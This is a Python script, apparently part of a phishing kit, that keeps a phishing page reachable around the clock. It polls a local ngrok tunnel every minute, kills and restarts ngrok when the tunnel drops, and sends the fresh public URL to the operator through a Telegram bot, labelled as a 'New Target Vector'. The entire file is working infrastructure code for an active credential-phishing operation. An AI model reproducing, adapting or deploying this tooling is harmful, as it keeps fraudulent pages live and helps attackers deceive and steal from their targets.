import os
import time
import requests
import subprocess
import json

# ==========================================
# NGROK AUTO-RESTARTER & DAEMON
# Keeps the phishing tunnel alive 24/7
# ==========================================

TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
PORT = 8000

def send_telegram_alert(message):
    if TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN":
        print("[!] Telegram token not set. Skipping alert.")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"[-] Failed to send Telegram alert: {e}")

def get_ngrok_url():
    try:
        response = requests.get("http://localhost:4040/api/tunnels", timeout=5)
        if response.status_code == 200:
            data = response.json()
            for tunnel in data['tunnels']:
                if tunnel['proto'] == 'https':
                    return tunnel['public_url']
    except requests.exceptions.ConnectionError:
        pass
    return None

def restart_ngrok():
    print("[*] Restarting Ngrok tunnel...")
    # Kill existing ngrok processes
    os.system("taskkill /f /im ngrok.exe >nul 2>&1")
    time.sleep(2)
    
    # Start new ngrok process in background
    subprocess.Popen(['ngrok', 'http', str(PORT)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5) # Wait for tunnel to establish
    
    new_url = get_ngrok_url()
    if new_url:
        print(f"[+] Ngrok started successfully: {new_url}")
        send_telegram_alert(f"🚨 <b>CYBER-OPS INFRASTRUCTURE UPDATE</b> 🚨\n\nNgrok tunnel restarted.\nNew Target Vector:\n👉 {new_url}")
    else:
        print("[-] Failed to retrieve new Ngrok URL.")

if __name__ == "__main__":
    print("[+] Ngrok Auto-Restarter Daemon Initialized.")
    print("[*] Monitoring tunnel health every 60 seconds...")
    
    while True:
        current_url = get_ngrok_url()
        if not current_url:
            print("[-] Ngrok tunnel is down! Initiating restart sequence...")
            restart_ngrok()
        else:
            print(f"[*] Tunnel is alive: {current_url}")
            
        time.sleep(60) # Check every minute
